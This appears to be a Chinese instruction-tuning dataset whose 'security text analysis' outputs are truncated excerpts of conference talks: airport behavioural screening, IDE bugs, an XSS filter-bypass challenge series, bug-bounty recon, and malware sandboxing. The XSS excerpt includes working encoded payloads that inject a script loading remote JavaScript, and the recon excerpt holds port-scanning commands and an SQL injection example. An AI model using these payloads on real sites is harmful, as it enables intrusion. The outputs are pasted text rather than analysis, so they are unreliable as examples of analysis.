{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nWhy Airport Security Cant Be Done FAST Semon Rezchikov, Joshua Engelman, Morgan Wang Hi, DEFCON 19! Here, weve compiled an outline of a small portion of the information we found and a detailed list of our sources in case youre interested in reading more about the FAST program. (Or about MALINTENT or Hostile Intent or SPOT or whatever else.) We thought youd find this more useful than the slides to our presentation, as (if you recall) we presented most of the information verbally, using the slides only as a visual counterpoint. In fact, our slides are mostly cute pictures of bunnies and puppies and trailers and TSA agents, which works great during DEFCON but isnt so great if you want to continue research outside of it. Our sources are broken up as follows: The articles on SPOT, Criticism of FAST, the legality of FAST, base rate fallacy, articles on FAST, Government Documents, and Information on SDS, the Israeli version of FAST. All of the documents are in the public domain and can be found using some creative Googling. - Semon, Morgan and Josh Outline FAST - Future Attribute Screening Technology Run by DoDs Behavioral Research Unit A series of rooms that use biometric scanners analyze your physiological signs while someone questions you try to detect whether someone passing through the FAST system intends to blow something up - Pretty much a polygraph test on steroids People: Check out http://www.dhs.gov/files/programs/gc_1218480185439.shtm It seems that FAST is being developed at Draper Labs (so the trailers indicate) Relations of various projects to each other: Project MALINTENT: the overarching project to detect malintent Hostile Intent: The actual technology that can detect malintent FAST: a trailer with a packaged, practically usable form of malintent detection technology History: Paul Ekman did a lot of research into faces and is known for his work on microexpressions. (Hes the guy the TV show Lie to Me is based on) He believes that things like detecting decepti", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nWorming through IDEs David Dworken `whoami`  David Dworken (@ddworken)  Security Engineer at Google  Standard disclaimer: Opinions expressed are my own  Hacking in both senses of the word  Writing silly useless but interesting code  Breaking serious real code for fun  I found and reported 30+ bugs in IDEs over a few month period  Note: All bugs in this presentation have either been ﬁxed or declared working-as-intended Why hack developers? Production Why hack developers? Production Where developers think the security boundary is Where developers think the security boundary is Where IDEs (used to) think the security boundary is IDEs are popular! https://insights.stackoverﬂow.com/survey/2019#technology-_-most-popular-development-environments VS Code: Trusting Workspace Settings https://code.visualstudio.com/docs/getstarted/settings VS Code: Trusting Workspace Settings Strace is amazing! https://strace.io/ Finding bugs with Strace  Files that don't exist: `cat /tmp/strace.out | grep ENOENT`  Oftentimes ﬁles that don't exist can be used to tweak a conﬁguration and achieve code execution  Files that are accessed: `cat /tmp/strace.out | grep open`  Knowing what ﬁles are accessed in what order can hint at how a program is processing the input  Commands that are run: `cat /tmp/strace.out | grep exec`  Look for command injection  Look for ways to achieve code execution using the launched programs (e.g. `__init__.py` ﬁles) VS Code: Locally resolved node_modules folder VS Code: Command Injection https://github.com/microsoft/vscode/blob/c23285f8c8b73228af4cce81721db105542c0cae/extensions/npm/src/features/packageJSONContribution.ts#L258 Visual Studio: Build Conﬁgs https://docs.microsoft.com/en-us/cpp/build/cmake-projects-in-visual-studio Note: Visual Studio != Visual Studio Code Visual Studio: Build Conﬁgs https://docs.microsoft.com/en-us/cpp/build/cmake-projects-in-visual-studio Note: Visual Studio != Visual Studio Code Visual Studio: Build Conﬁgs https://docs.microsoft.com/en-u", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nxss 修炼之-独孤九剑 香草 2020-05-31 共 170 人围观 WEB 安全编辑 缘起 群里某个同学在 xss 实战中遇到了一个地方过滤了 =() 问我怎么办 当然这个问题很简单我很快在脑海里想出了好几种方法当时我当时就像着魔似的问 自己如果同时过滤 =(). 又怎么办呢 很快又有了办法如果同时又过滤了 =().%呢 同时过滤 =().&#\\ 呢 .. 于是便有了这次 xss 修炼之-独孤九剑 我先出了第一题也就是那个同学遇到的场景当然每道题出来的时候我肯定需要先完 成出题之前我也是没把握的 <?php $data=$_GET['data']; $data = str_replace(\"=\",\"\",$data); $data = str_replace(\"(\",\"\",$data); $data = str_replace(\")\",\"\",$data); ?> <html> <head> <meta charset=\"utf-8\"> <title>独孤九剑-第一式</title> </head> <body> <h2>过滤了 =()少侠骨骼惊奇必是练武奇才</h2> <h2>要求加载任意 JS 代码,成功加载 http://xcao.vip/xss/alert.js 表示完成挑战</h2> <input type=\"text\" value=\"<?php echo $data;?>\"> </body> </html> http://xcao.vip/test/xss1.php?data=1 当时我想到的解法是 独孤九剑第一式 这里过滤了 =() http://xcao.vip/test/xss1.php?data=%22%3E%3Csvg%3E%3Cscript%3E%26%23x65%3B%26%2 3x76%3B%26%23x61%3B%26%23x6c%3B%26%23x28%3B%26%23x6c%3B%26%23x6f%3B%26%23x63%3 B%26%23x61%3B%26%23x74%3B%26%23x69%3B%26%23x6f%3B%26%23x6e%3B%26%23x2e%3B%26%23 x68%3B%26%23x61%3B%26%23x73%3B%26%23x68%3B%26%23x2e%3B%26%23x73%3B%26%23x6c%3B% 26%23x69%3B%26%23x63%3B%26%23x65%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%26%23x2 9%3B%3C/script%3E%3C/svg%3E#with(document)body.appendChild(createElement('scrip t')).src='http://xcao.vip/test/alert.js' 解码后就是这样这里是因为在 svg 下面的 script 可以使用 html 编码利用 html 编码绕过=() 的过滤 http://xcao.vip/test/xss1.php?data=\"><svg><script>&#x65;&#x76;&#x61;&#x6c;&#x28; &#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x68;&#x61;&#x73;&#x68;& #x2e;&#x73;&#x6c;&#x69;&#x63;&#x65;&#x28;&#x31;&#x29;&#x29;</script></svg>#with (document)body.appendChild(createElement('script')).src='http://127.0.0.1/xss/a lert.js' 独孤九剑第二式 这里过滤了 =(). 新增了.的过滤 利用 setTimeout 以及``代替括号同时采用\\u 编码绕过对()和.的限制 http://xcao.vip/test/xss2.php?data=xxx%22%3E%3Cscript%3EsetTimeout`\\u0065\\u0076 \\u0061\\u006c\\u0028\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002e\\u0068\\ u0061\\u0073\\u0068\\u002e\\u0073\\u006c\\u0069\\u0063\\u0065\\u0028\\u0031\\u0029\\u0029 `;%3C/script%3E#with(document)body.appendChild(createElement('script')).src='ht tp://xcao.vip/xs", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nSRC 1. IP 2. 1.SSL 2. 3.Github 4.DNS 5. SSL 12 SRC SSL 1.censys.io 2.crt.sh 1.riskiq 2.shodan 3.ﬁndsubdomains [] [] 4.censys.io 5.dnsdb.io DNS SSLGithub crt.shnss.a.com Github   GET  json  fastjson   Github github IP IPASIP IP : http://IPwhois.cnnic.net.cn/ 123.58.191.1 [IP]  IP  Netease-Network  IPNetease-Network  neteaseIPIP IP IP? IP [] IPpythonmasscan +nmap <<>>  masscanIP waf  IPwafIPIP masscanIP subprocessmasscan IP wafbreak 59.111.14.159 IP sudo masscan 59.111.14.159 -p1-65535 --rate 2000 IPpython  masscan-oX -oJ masscan masscan masscannmapnmap -sV -sT -Pn --version-all --open -sV -sT -sS-sT -sTroot -sSroot -Pnnmapping masscan nmap --open open --version-all [] 1., 2.rapid7fdnsrndsjson https://opendata.rapid7.com/sonar.rdns_v2/ https://opendata.rapid7.com/sonar.fdns_v2/ 1. 2. 3. 4.(js) 20161000web (js) []  postgetjs apijs 2016Uberapi @cy hackerone1UberSQL apijsjs1api sqlUber api api2jsapijs 8apiapi  [] openidapi  3000$  Uber 403404 IP 106.**.**.147 403  http://106.**.**.147/adver/landing.php  URL http://106.**.**.147/adver/landing.php?mac=1 SQL  SRC ? dict_count dict_count1order by dict_count desc SRC 1. 2. APPiosAndroidAPP APPSSLAPP APP iosiPhoneSSL Pining Disable SSL Pining http://pwn.dog/index.php/ios/ios-disable-ssl-pinning.html https://github.com/WooyunDota/DroidSSLUnpinning [] [] [APP]", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nInside the Matrix,How to Build Transparent Sandbox for Malware Analysis C.K Chen (Bletchley) 1 Who am I C.K Chen (陳仲寬) P.H.D Student in DSNS Lab, NCTU Research in Reverse Engineering Malware Analysis Virtual Machine 2 About DSNS 謝續平教授 實驗室研究方向 惡意程式分析 虛擬機器 數位鑑識 網路安全 3 Outline VM for Malware Analysis Detect Security Utilities Out-of-Box Monitor Emulation Virtualization Malware Behavior Analysis Dynamic Taint Tracking Cloudebug Anti-VM Behavior Comparison to Detect Anti-VM 4 VM for Malware Analysis VM play an important role for nowadays for malware analysis Isolated Environment Fast Recovery 5 Reverse with VM What we are doing everyday Automatic analysis malware: Put monitor program into VM to keep track of malware Reversing Malware Put reversing tools(debugger, disassembler) into VM and reversing VMM Host OS 6 Detect Security Utilities While your security utilities are placed in the same environment, it is possible for malware to detect its existence KillAV Anti-Debugger 7 Kill AV Malware can check the existence of anti-virus, and then stop or bypass anti-virus Process Name If important function being hooked Read Process Memory Any software in the same environment with malware can be detected 8 Anti-Debug To confuse analyst, malware employ anti-debug to detect or stop debug software Everything you put into VM expose the threat File Process Registry 9 Anti-Debug Example push offset exception_handler; set exception handler push dword ptr fs:[0h] mov dword ptr fs:[0h],esp xor eax,eax;reset EAX invoke int3 int 3h pop dword ptr fs:[0h];restore exception handler add esp,4 test eax,eax; check the flag je rt_choke jmp rf_choke exception_handler: mov eax,dword ptr [esp+0xc];EAX = ContextRecord mov dword ptr [eax+0xb0],0xffffffff;set flag (ContextRecord.EAX) inc dword ptr [eax+0xb8];set ContextRecord.EIP xor eax,eax retn 10 Anti-Debug Result 11 The Ultimate Anti-Debugging Reference http://pferrie.host22.com/papers/antidebug.pdf 12 How can we do? Can we move analysis tools outsid", "category": "text_analysis", "source": "security_papers"}
